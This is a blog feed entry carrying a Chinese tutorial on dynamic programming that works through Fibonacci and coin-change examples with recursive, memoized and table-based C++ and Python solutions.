    <content type="html"><![CDATA[<p>动态规划</p><p><strong>首先，动态规划问题的一般形式就是求最值</strong>。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求<strong>最长</strong>递增子序列呀，<strong>最小</strong>编辑距离呀等等。</p><p>既然是要求最值，核心问题是什么呢？<strong>求解动态规划的核心问题是穷举</strong>。因为要求最值，肯定要把所有可行的答案穷举出来，然后在其中找最值呗。</p><p>动态规划这么简单，就是穷举就完事了？我看到的动态规划问题都很难啊！</p><p>首先，动态规划的穷举有点特别，因为这类问题<strong>存在「重叠子问题」</strong>，如果暴力穷举的话效率会极其低下，所以需要「备忘录」或者「DP table」来优化穷举过程，避免不必要的计算。</p><p>而且，动态规划问题一定会<strong>具备「最优子结构」</strong>，才能通过子问题的最值得到原问题的最值。</p><p>另外，虽然动态规划的核心思想就是穷举求最值，但是问题可以千变万化，穷举所有可行解其实并不是一件容易的事，只有列出<strong>正确的「状态转移方程」</strong>才能正确地穷举。</p><p>以上提到的重叠子问题、最优子结构、状态转移方程就是动态规划三要素。具体什么意思等会会举例详解，但是在实际的算法问题中，<strong>写出状态转移方程是最困难的</strong>，这也就是为什么很多朋友觉得动态规划问题困难的原因，我来提供我研究出来的一个思维框架，辅助你思考状态转移方程：</p><p><strong>明确 base case -&gt; 明确「状态」-&gt; 明确「选择」 -&gt; 定义 dp 数组/函数的含义</strong>。</p><p>按上面的套路走，最后的结果就可以套这个框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化 base case</span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>][...] = base</span><br><span class="line"><span class="comment"># 进行状态转移</span></span><br><span class="line"><span class="keyword">for</span> 状态<span class="number">1</span> <span class="keyword">in</span> 状态<span class="number">1</span>的所有取值：</span><br><span class="line">    <span class="keyword">for</span> 状态<span class="number">2</span> <span class="keyword">in</span> 状态<span class="number">2</span>的所有取值：</span><br><span class="line">        <span class="keyword">for</span> ...</span><br><span class="line">            dp[状态<span class="number">1</span>][状态<span class="number">2</span>][...] = 求最值(选择<span class="number">1</span>，选择<span class="number">2.</span>..)</span><br></pre></td></tr></table></figure><p>下面通过斐波那契数列问题和凑零钱问题来详解动态规划的基本原理。前者主要是让你明白什么是重叠子问题（斐波那契数列没有求最值，所以严格来说不是动态规划问题），后者主要举集中于如何列出状态转移方程。</p><h3 id="一、斐波那契数列"><a href="#一、斐波那契数列" class="headerlink" title="一、斐波那契数列"></a>一、斐波那契数列</h3><p>请读者不要嫌弃这个例子简单，<strong>只有简单的例子才能让你把精力充分集中在算法背后的通用思想和技巧上，而不会被那些隐晦的细节问题搞的莫名其妙</strong>。想要困难的例子，历史文章里有的是。</p><p><strong>1、暴力递归</strong></p><p>斐波那契数列的数学形式就是递归的，写成代码就是这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">1</span> || N == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> fib(N - <span class="number">1</span>) + fib(N - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：但凡遇到需要递归的问题，最好都画出递归树，这对你分析算法的复杂度，寻找算法低效的原因都有巨大帮助。</p><p>这个递归树怎么理解？就是说想要计算原问题 <code>f(20)</code>，我就得先计算出子问题 <code>f(19)</code> 和 <code>f(18)</code>，然后要计算 <code>f(19)</code>，我就要先算出子问题 <code>f(18)</code> 和 <code>f(17)</code>，以此类推。最后遇到 <code>f(1)</code> 或者 <code>f(2)</code> 的时候，结果已知，就能直接返回结果，递归树不再向下生长了。</p><p><strong>递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。</strong></p><p>首先计算子问题个数，即递归树中节点的总数。显然二叉树节点总数为指数级别，所以子问题个数为 O(2^n)。</p><p>然后计算解决一个子问题的时间，在本算法中，没有循环，只有 <code>f(n - 1) + f(n - 2)</code> 一个加法操作，时间为 O(1)。</p><p>所以，这个算法的时间复杂度为二者相乘，即 O(2^n)，指数级别，爆炸。</p><p>观察递归树，很明显发现了算法低效的原因：存在大量重复计算，比如 <code>f(18)</code> 被计算了两次，而且你可以看到，以 <code>f(18)</code> 为根的这个递归树体量巨大，多算一遍，会耗费巨大的时间。更何况，还不止 <code>f(18)</code> 这一个节点被重复计算，所以这个算法及其低效。</p><p>这就是动态规划问题的第一个性质：<strong>重叠子问题</strong>。下面，我们想办法解决这个问题。</p><p><strong>2、带备忘录的递归解法</strong></p><p>明确了问题，其实就已经把问题解决了一半。即然耗时的原因是重复计算，那么我们可以造一个「备忘录」，每次算出某个子问题的答案后别急着返回，先记到「备忘录」里再返回；每次遇到一个子问题先去「备忘录」里查一查，如果发现之前已经解决过这个问题了，直接把答案拿出来用，不要再耗时去计算了。</p><p>一般使用一个数组充当这个「备忘录」，当然你也可以使用哈希表（字典），思想都是一样的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">memo</span><span class="params">(N + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> helper(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">helper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; memo, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 已经计算过</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = helper(memo, n - <span class="number">1</span>) + helper(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，画出递归树，你就知道「备忘录」到底做了什么。</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/2.jpg" alt="img"></p><p>实际上，带「备忘录」的递归算法，把一棵存在巨量冗余的递归树通过「剪枝」，改造成了一幅不存在冗余的递归图，极大减少了子问题（即递归图中节点）的个数。</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/3.jpg" alt="img"></p><p><strong>递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。</strong></p><p>子问题个数，即图中节点的总数，由于本算法不存在冗余计算，子问题就是 <code>f(1)</code>, <code>f(2)</code>, <code>f(3)</code> … <code>f(20)</code>，数量和输入规模 n = 20 成正比，所以子问题个数为 O(n)。</p><p>解决一个子问题的时间，同上，没有什么循环，时间为 O(1)。</p><p>所以，本算法的时间复杂度是 O(n)。比起暴力算法，是降维打击。</p><p>至此，带备忘录的递归解法的效率已经和迭代的动态规划解法一样了。实际上，这种解法和迭代的动态规划已经差不多了，只不过这种方法叫做「自顶向下」，动态规划叫做「自底向上」。</p><p>啥叫「自顶向下」？注意我们刚才画的递归树（或者说图），是从上向下延伸，都是从一个规模较大的原问题比如说 <code>f(20)</code>，向下逐渐分解规模，直到 <code>f(1)</code> 和 <code>f(2)</code> 这两个 base case，然后逐层返回答案，这就叫「自顶向下」。</p><p>啥叫「自底向上」？反过来，我们直接从最底下，最简单，问题规模最小的 <code>f(1)</code> 和 <code>f(2)</code> 开始往上推，直到推到我们想要的答案 <code>f(20)</code>，这就是动态规划的思路，这也是为什么动态规划一般都脱离了递归，而是由循环迭代完成计算。</p><p><strong>3、dp 数组的迭代解法</strong></p><p>有了上一步「备忘录」的启发，我们可以把这个「备忘录」独立出来成为一张表，就叫做 DP table 吧，在这张表上完成「自底向上」的推算岂不美哉！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">1</span> || N == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(N + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">1</span>] = dp[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= N; i++)</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/4.jpg" alt="img"></p><p>画个图就很好理解了，而且你发现这个 DP table 特别像之前那个「剪枝」后的结果，只是反过来算而已。实际上，带备忘录的递归解法中的「备忘录」，最终完成后就是这个 DP table，所以说这两种解法其实是差不多的，大部分情况下，效率也基本相同。</p><p>这里，引出「状态转移方程」这个名词，实际上就是描述问题结构的数学形式：</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/fib.png" alt="img"></p><p>为啥叫「状态转移方程」？其实就是为了听起来高端。你把 <code>f(n)</code> 想做一个状态 <code>n</code>，这个状态 <code>n</code> 是由状态 <code>n - 1</code> 和状态 <code>n - 2</code> 相加转移而来，这就叫状态转移，仅此而已。</p><p>你会发现，上面的几种解法中的所有操作，例如 <code>return f(n - 1) + f(n - 2)</code>，<code>dp[i] = dp[i - 1] + dp[i - 2]</code>，以及对备忘录或 DP table 的初始化操作，都是围绕这个方程式的不同表现形式。可见列出「状态转移方程」的重要性，它是解决问题的核心。而且很容易发现，其实状态转移方程直接代表着暴力解法。</p><p><strong>千万不要看不起暴力解，动态规划问题最困难的就是写出这个暴力解，即状态转移方程</strong>。只要写出暴力解，优化方法无非是用备忘录或者 DP table，再无奥妙可言。</p><p>这个例子的最后，讲一个细节优化。细心的读者会发现，根据斐波那契数列的状态转移方程，当前状态只和之前的两个状态有关，其实并不需要那么长的一个 DP table 来存储所有的状态，只要想办法存储之前的两个状态就行了。所以，可以进一步优化，把空间复杂度降为 O(1)：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">2</span> || n == <span class="number">1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> prev = <span class="number">1</span>, curr = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = prev + curr;</span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> curr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个技巧就是所谓的「<strong>状态压缩</strong>」，如果我们发现每次状态转移只需要 DP table 中的一部分，那么可以尝试用状态压缩来缩小 DP table 的大小，只记录必要的数据，上述例子就相当于把DP table 的大小从 <code>n</code> 缩小到 2。后续的动态规划章节中我们还会看到这样的例子，一般来说是把一个二维的 DP table 压缩成一维，即把空间复杂度从 O(n^2) 压缩到 O(n)。</p><p>有人会问，动态规划的另一个重要特性「最优子结构」，怎么没有涉及？下面会涉及。斐波那契数列的例子严格来说不算动态规划，因为没有涉及求最值，以上旨在说明重叠子问题的消除方法，演示得到最优解法逐步求精的过程。下面，看第二个例子，凑零钱问题。</p><h3 id="二、凑零钱问题"><a href="#二、凑零钱问题" class="headerlink" title="二、凑零钱问题"></a>二、凑零钱问题</h3><p>先看下题目：给你 <code>k</code> 种面值的硬币，面值分别为 <code>c1, c2 ... ck</code>，每种硬币的数量无限，再给一个总金额 <code>amount</code>，问你<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，算法返回 -1 。算法的函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// coins 中是可选硬币面值，amount 是目标金额</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="keyword">int</span>[] coins, <span class="keyword">int</span> amount)</span></span>;</span><br></pre></td></tr></table></figure><p>比如说 <code>k = 3</code>，面值分别为 1，2，5，总金额 <code>amount = 11</code>。那么最少需要 3 枚硬币凑出，即 11 = 5 + 5 + 1。</p><p>你认为计算机应该如何解决这个问题？显然，就是把所有可能的凑硬币方法都穷举出来，然后找找看最少需要多少枚硬币。</p><p><strong>1、暴力递归</strong></p><p>首先，这个问题是动态规划问题，因为它具有「最优子结构」的。<strong>要符合「最优子结构」，子问题间必须互相独立</strong>。啥叫相互独立？你肯定不想看数学证明，我用一个直观的例子来讲解。</p><p>比如说，假设你考试，每门科目的成绩都是互相独立的。你的原问题是考出最高的总成绩，那么你的子问题就是要把语文考到最高，数学考到最高…… 为了每门课考到最高，你要把每门课相应的选择题分数拿到最高，填空题分数拿到最高…… 当然，最终就是你每门课都是满分，这就是最高的总成绩。</p><p>得到了正确的结果：最高的总成绩就是总分。因为这个过程符合最优子结构，“每门科目考到最高”这些子问题是互相独立，互不干扰的。</p><p>但是，如果加一个条件：你的语文成绩和数学成绩会互相制约，数学分数高，语文分数就会降低，反之亦然。这样的话，显然你能考到的最高总成绩就达不到总分了，按刚才那个思路就会得到错误的结果。因为子问题并不独立，语文数学成绩无法同时最优，所以最优子结构被破坏。</p><p>回到凑零钱问题，为什么说它符合最优子结构呢？比如你想求 <code>amount = 11</code> 时的最少硬币数（原问题），如果你知道凑出 <code>amount = 10</code> 的最少硬币数（子问题），你只需要把子问题的答案加一（再选一枚面值为 1 的硬币）就是原问题的答案。因为硬币的数量是没有限制的，所以子问题之间没有相互制，是互相独立的。</p><p>PS：关于最优子结构的问题，后文<a href="https://labuladong.gitee.io/algo/动态规划系列/最优子结构.html" target="_blank" rel="noopener">动态规划答疑篇</a> 还会再举例探讨。</p><p>那么，既然知道了这是个动态规划问题，就要思考<strong>如何列出正确的状态转移方程</strong>？</p><p>1、<strong>确定 base case</strong>，这个很简单，显然目标金额 <code>amount</code> 为 0 时算法返回 0，因为不需要任何硬币就已经凑出目标金额了。</p><p>2、<strong>确定「状态」，也就是原问题和子问题中会变化的变量</strong>。由于硬币数量无限，硬币的面额也是题目给定的，只有目标金额会不断地向 base case 靠近，所以唯一的「状态」就是目标金额 <code>amount</code>。</p><p>3、<strong>确定「选择」，也就是导致「状态」产生变化的行为</strong>。目标金额为什么变化呢，因为你在选择硬币，你每选择一枚硬币，就相当于减少了目标金额。所以说所有硬币的面值，就是你的「选择」。</p><p>4、<strong>明确 <code>dp</code> 函数/数组的定义</strong>。我们这里讲的是自顶向下的解法，所以会有一个递归的 <code>dp</code> 函数，一般来说函数的参数就是状态转移中会变化的量，也就是上面说到的「状态」；函数的返回值就是题目要求我们计算的量。就本题来说，状态只有一个，即「目标金额」，题目要求我们计算凑出目标金额所需的最少硬币数量。所以我们可以这样定义 <code>dp</code> 函数：</p><p><code>dp(n)</code> 的定义：输入一个目标金额 <code>n</code>，返回凑出目标金额 <code>n</code> 的最少硬币数量。</p><p>搞清楚上面这几个关键点，解法的伪码就可以写出来了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伪码框架</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins: List[int], amount: int)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义：要凑出金额 n，至少要 dp(n) 个硬币</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="comment"># 做选择，选择需要硬币最少的那个结果</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            res = min(res, <span class="number">1</span> + dp(n - coin))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 题目要求的最终结果是 dp(amount)</span></span><br><span class="line">    <span class="keyword">return</span> dp(amount)</span><br></pre></td></tr></table></figure><p>根据伪码，我们加上 base case 即可得到最终的答案。显然目标金额为 0 时，所需硬币数量为 0；当目标金额小于 0 时，无解，返回 -1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins: List[int], amount: int)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="comment"># base case</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="comment"># 求最小值，所以初始化为正无穷</span></span><br><span class="line">        res = float(<span class="string">'INF'</span>)</span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            subproblem = dp(n - coin)</span><br><span class="line">            <span class="comment"># 子问题无解，跳过</span></span><br><span class="line">            <span class="keyword">if</span> subproblem == <span class="number">-1</span>: <span class="keyword">continue</span></span><br><span class="line">            res = min(res, <span class="number">1</span> + subproblem)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res <span class="keyword">if</span> res != float(<span class="string">'INF'</span>) <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp(amount)</span><br></pre></td></tr></table></figure><p>至此，状态转移方程其实已经完成了，以上算法已经是暴力解法了，以上代码的数学形式就是状态转移方程：</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/coin.png" alt="img"></p><p>至此，这个问题其实就解决了，只不过需要消除一下重叠子问题，比如 <code>amount = 11, coins = {1,2,5}</code> 时画出递归树看看：</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/5.jpg" alt="img"></p><p><strong>递归算法的时间复杂度分析：子问题总数 x 每个子问题的时间</strong>。</p><p>子问题总数为递归树节点个数，这个比较难看出来，是 O(n^k)，总之是指数级别的。每个子问题中含有一个 for 循环，复杂度为 O(k)。所以总时间复杂度为 O(k * n^k)，指数级别。</p><p><strong>2、带备忘录的递归</strong></p><p>类似之前斐波那契数列的例子，只需要稍加修改，就可以通过备忘录消除子问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins: List[int], amount: int)</span>:</span></span><br><span class="line">    <span class="comment"># 备忘录</span></span><br><span class="line">    memo = dict()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="comment"># 查备忘录，避免重复计算</span></span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">in</span> memo: <span class="keyword">return</span> memo[n]</span><br><span class="line">        <span class="comment"># base case</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        res = float(<span class="string">'INF'</span>)</span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            subproblem = dp(n - coin)</span><br><span class="line">            <span class="keyword">if</span> subproblem == <span class="number">-1</span>: <span class="keyword">continue</span></span><br><span class="line">            res = min(res, <span class="number">1</span> + subproblem)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记入备忘录</span></span><br><span class="line">        memo[n] = res <span class="keyword">if</span> res != float(<span class="string">'INF'</span>) <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp(amount)</span><br></pre></td></tr></table></figure><p>不画图了，很显然「备忘录」大大减小了子问题数目，完全消除了子问题的冗余，所以子问题总数不会超过金额数 <code>n</code>，即子问题数目为 O(n)。处理一个子问题的时间不变，仍是 O(k)，所以总的时间复杂度是 O(kn)。</p><p><strong>3、dp 数组的迭代解法</strong></p><p>当然，我们也可以自底向上使用 dp table 来消除重叠子问题，关于「状态」「选择」和 base case 与之前没有区别，<code>dp</code> 数组的定义和刚才 <code>dp</code> 函数类似，也是把「状态」，也就是目标金额作为变量。不过 <code>dp</code> 函数体现在函数参数，而 <code>dp</code> 数组体现在数组索引：</p><p><strong><code>dp</code> 数组的定义：当目标金额为 <code>i</code> 时，至少需要 <code>dp[i]</code> 枚硬币凑出</strong>。</p><p>根据我们文章开头给出的动态规划代码框架可以写出如下解法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 数组大小为 amount + 1，初始值也为 amount + 1</span></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount + <span class="number">1</span>, amount + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 外层 for 循环在遍历所有状态的所有取值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dp.size(); i++) &#123;</span><br><span class="line">        <span class="comment">// 内层 for 循环在求所有选择的最小值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> coin : coins) &#123;</span><br><span class="line">            <span class="comment">// 子问题无解，跳过</span></span><br><span class="line">            <span class="keyword">if</span> (i - coin &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            dp[i] = min(dp[i], <span class="number">1</span> + dp[i - coin]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (dp[amount] == amount + <span class="number">1</span>) ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/6.jpg" alt="img"></p><p>PS：为啥 <code>dp</code> 数组初始化为 <code>amount + 1</code> 呢，因为凑成 <code>amount</code> 金额的硬币数最多只可能等于 <code>amount</code>（全用 1 元面值的硬币），所以初始化为 <code>amount + 1</code> 就相当于初始化为正无穷，便于后续取最小值。</p><h3 id="三、最后总结"><a href="#三、最后总结" class="headerlink" title="三、最后总结"></a>三、最后总结</h3><p>第一个斐波那契数列的问题，解释了如何通过「备忘录」或者「dp table」的方法来优化递归树，并且明确了这两种方法本质上是一样的，只是自顶向下和自底向上的不同而已。</p><p>第二个凑零钱的问题，展示了如何流程化确定「状态转移方程」，只要通过状态转移方程写出暴力递归解，剩下的也就是优化递归树，消除重叠子问题而已。</p><p>如果你不太了解动态规划，还能看到这里，真得给你鼓掌，相信你已经掌握了这个算法的设计技巧。</p><p><strong>计算机解决问题其实没有任何奇技淫巧，它唯一的解决办法就是穷举</strong>，穷举所有可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明地穷举”。</p><p>列出动态转移方程，就是在解决“如何穷举”的问题。之所以说它难，一是因为很多穷举需要递归实现，二是因为有的问题本身的解空间复杂，不那么容易穷举完整。</p><p>备忘录、DP table 就是在追求“如何聪明地穷举”。用空间换时间的思路，是降低时间复杂度的不二法门，除此之外，试问，还能玩出啥花活？</p><p>之后我们会有一章专门讲解动态规划问题，如果有任何问题都可以随时回来重读本文，希望读者在阅读每个题目和解法时，多往「状态」和「选择」上靠，才能对这套框架产生自己的理解，运用自如。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;动态规划&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先，动态规划问题的一般形式就是求最值&lt;/strong&gt;。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求&lt;strong&gt;最长&lt;/strong&gt;递增子序列呀，&lt;strong&gt;最小&lt;/strong&gt;编辑
      
    
    </summary>
    
    
    
      <category term="algorithm" scheme="https://kayleh.top/tags/algorithm/"/>
    
  </entry>
  
</feed>
